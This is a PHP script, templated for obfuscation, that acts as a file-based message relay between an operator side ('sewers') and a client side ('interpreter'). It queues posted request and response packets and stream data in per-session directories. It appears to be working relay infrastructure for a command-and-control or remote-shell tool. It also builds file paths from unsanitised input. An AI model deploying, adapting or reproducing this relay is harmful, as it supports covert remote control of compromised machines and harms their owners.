<?php

// Set variables

  $obf_var_requests_dir = "";
  $obf_var_responses_dir = "";
  $obf_var_streams_dir = "";
  $obf_var_stream_requests_dir = "";
  $obf_var_stream_buffer_dir = "";
  $obf_var_sewers_post_tag = "";
  $obf_var_sewers_get_tag = "";
  $obf_var_sewers_stream_tag = "";
  $obf_var_interpreter_post_tag = "";
  $obf_var_interpreter_get_tag = "";
  $obf_var_interpreter_stream_tag = "";
  $obf_var_packet = file_get_contents("php://input");
  $obf_var_split_packet = explode("\n", $obf_var_packet);
  if ( isset($obf_var_split_packet[0]) && isset($obf_var_split_packet[1]) ) {
    $obf_var_req_type = $obf_var_split_packet[0];
    $obf_var_session_id = $obf_var_split_packet[1];
  }
  $obf_var_body = join( "\n", array_slice($obf_var_split_packet, 2) );

// Debug packet

  // ob_start();
  // var_dump("\n========PACKET========\n" . $obf_var_req_type . "\n" . $obf_var_session_id . "\n" . $obf_var_body . "\n======================\n");
  // error_log( ob_get_clean(), 4 );

// Set functions

  // function obf_func_randomString() {
  //  $obf_var_chars = "abcdefghijklmnopqrstuvwxyz";
  //  $obf_var_charsLength = strlen($obf_var_chars);
  //  $obf_var_buffer = "";
  //  while ( strlen($obf_var_buffer) < 16 ) {
  //    $obf_var_buffer .= $obf_var_chars[rand(0, $obf_var_charsLength - 1)];
  //  }
  //  return $obf_var_buffer;
  // }

  function obf_func_getDirEntries($obf_var_path) {
    return array_diff( scandir($obf_var_path), array(".", "..") );
  }

  function obf_func_addPacket($obf_var_path, $obf_var_body) {
    $obf_var_last = 0;
    $obf_var_neighbours = obf_func_getDirEntries($obf_var_path);
    foreach ($obf_var_neighbours as $obf_var_neighbour) {
      $obf_var_neighbour > $obf_var_last ? $obf_var_last = $obf_var_neighbour : "";
    }
    $obf_var_new = $obf_var_last + 1;
    $obf_var_writefile = $obf_var_path . "/" . $obf_var_new;
    $obf_var_handle = fopen($obf_var_writefile, "w") or exit();
    if ( !flock($obf_var_handle, LOCK_SH) ) {
      for ($i = 0; $i < 60; $i++) {
        if ( flock($obf_var_handle, LOCK_SH) ) {
          break;
        }
        sleep(1);
      }
    }
    fwrite($obf_var_handle, $obf_var_body);
    fflush($obf_var_handle);
    flock($obf_var_handle, LOCK_UN);
    fclose($obf_var_handle);
  }

// Parse packet

  if ( !is_dir("./" . $obf_var_responses_dir) ) {
    mkdir("./" . $obf_var_responses_dir);
  }

  if ( !is_dir("./" . $obf_var_requests_dir) ) {
    mkdir("./" . $obf_var_requests_dir);
  }

  // Sewers GET request
  if ( $obf_var_req_type == $obf_var_sewers_get_tag && $obf_var_session_id != "" ) {
    if ( is_dir("./" . $obf_var_responses_dir . "/" . $obf_var_session_id) ) {
      if ($obf_var_body == "") {
        echo join( ",", obf_func_getDirEntries("./" . $obf_var_responses_dir . "/" . $obf_var_session_id) );
      } else {
        if ( is_file("./" . $obf_var_responses_dir . "/" . $obf_var_session_id . "/" . $obf_var_body) ) {
          echo file_get_contents("./" . $obf_var_responses_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
          unlink("./" . $obf_var_responses_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
        } else {
          http_response_code(404);
          exit();
        }
      }
    } else {
      http_response_code(404);
      exit();
    }
  } elseif ( $obf_var_req_type == $obf_var_sewers_get_tag && $obf_var_session_id == "" ) {
    echo join( ",", obf_func_getDirEntries("./" . $obf_var_responses_dir) );
  }

  // Sewers POST request
  if ( $obf_var_req_type == $obf_var_sewers_post_tag && isset($obf_var_session_id) ) {
    if ( !is_dir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id) ) {
      mkdir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id);
    }
    obf_func_addPacket("./" . $obf_var_requests_dir . "/" . $obf_var_session_id, $obf_var_body);
  }

  // Sewers stream request
  if ( $obf_var_req_type == $obf_var_sewers_stream_tag && isset($obf_var_session_id) ) {
    $obf_var_stream_session_id = preg_replace("/\n.*$/", "", $obf_var_body);
    if ( preg_match("/^\w+$/", $obf_var_stream_session_id) ) {
      if ( !is_dir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id) ) {
        mkdir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id);
      }
      if ( !is_dir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id) ) {
        mkdir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id);
      }
      if ( !is_dir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_requests_dir) ) {
        mkdir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_requests_dir);
      }
      if ( !is_dir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_buffer_dir) ) {
        mkdir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_buffer_dir);
      }
      $obf_var_body = preg_replace("/.*?\n/", "", $obf_var_body);
      if ($obf_var_body == "") {
        $obf_var_buffer_dir_entries = obf_func_getDirEntries("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_buffer_dir);
        $obf_var_buffer_packets = [];
        foreach ($obf_var_buffer_dir_entries as $obf_var_key => $obf_var_buffer_packet) {
          array_push( $obf_var_buffer_packets, file_get_contents("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_buffer_dir . "/" . $obf_var_buffer_packet) );
          unlink("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_buffer_dir . "/" . $obf_var_buffer_packet);
        }
        echo join("", $obf_var_buffer_packets);
      } else {
        obf_func_addPacket("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_requests_dir, $obf_var_body);
      }
    } else {
      http_response_code(404);
      exit();
    }
  }

  // Interpreter GET request
  if ($obf_var_req_type == $obf_var_interpreter_get_tag && $obf_var_session_id != "" ) {
    if ( !is_dir("./" . $obf_var_responses_dir . "/" . $obf_var_session_id) ) {
      mkdir("./" . $obf_var_responses_dir . "/" . $obf_var_session_id);
    }
    if ( !is_dir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id) ) {
      mkdir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id);
    }
    if ($obf_var_body == "") {
      $obf_var_requests_dir_entries = obf_func_getDirEntries("./" . $obf_var_requests_dir . "/" . $obf_var_session_id);
      if ( count($obf_var_requests_dir_entries) > 0 ) {
        echo join(",", $obf_var_requests_dir_entries);
      } else {
        http_response_code(404);
        exit();
      }
    } else {
      if ( is_file("./" . $obf_var_requests_dir . "/" . $obf_var_session_id . "/" . $obf_var_body) ) {
        echo file_get_contents("./" . $obf_var_requests_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
        unlink("./" . $obf_var_requests_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
      } else {
        http_response_code(404);
        exit();
      }
    }
  }

  // Interpreter POST request
  if ($obf_var_req_type == $obf_var_interpreter_post_tag && isset($obf_var_session_id) ) {
    if ( !is_dir("./" . $obf_var_responses_dir . "/" . $obf_var_session_id) ) {
      mkdir("./" . $obf_var_responses_dir . "/" . $obf_var_session_id);
    }
    if ( !is_dir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id) ) {
      mkdir("./" . $obf_var_requests_dir . "/" . $obf_var_session_id);
    }
    obf_func_addPacket("./" . $obf_var_responses_dir . "/" . $obf_var_session_id, $obf_var_body);
  }

  // Interpreter stream request
  if ( $obf_var_req_type == $obf_var_interpreter_stream_tag && isset($obf_var_session_id) ) {
    $obf_var_stream_session_id = preg_replace("/\n.*$/", "", $obf_var_body);
    if ( preg_match("/^\w+$/", $obf_var_stream_session_id) ) {
      $obf_var_body = preg_replace("/.*?\n/", "", $obf_var_body);
      if ( !is_dir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id) ) {
        mkdir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id);
      }
      if ( !is_dir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id) ) {
        mkdir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id);
      }
      if ( !is_dir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_requests_dir) ) {
        mkdir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_requests_dir);
      }
      if ( !is_dir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_buffer_dir) ) {
        mkdir("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_buffer_dir);
      }
      if ($obf_var_body != "") {
        obf_func_addPacket("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_buffer_dir , $obf_var_body);
      }
      $obf_var_requests_dir_entries = obf_func_getDirEntries("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_requests_dir);
      foreach ($obf_var_requests_dir_entries as $obf_var_key => $obf_var_dir) {
        $obf_var_response = file_get_contents("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_requests_dir . "/" . $obf_var_dir);
        unlink("./" . $obf_var_streams_dir . "/" . $obf_var_session_id . "/" . $obf_var_stream_session_id . "/" . $obf_var_stream_requests_dir . "/" . $obf_var_dir);
        echo $obf_var_response;
      }
    } else {
      http_response_code(404);
      exit();
    }
  }

?>
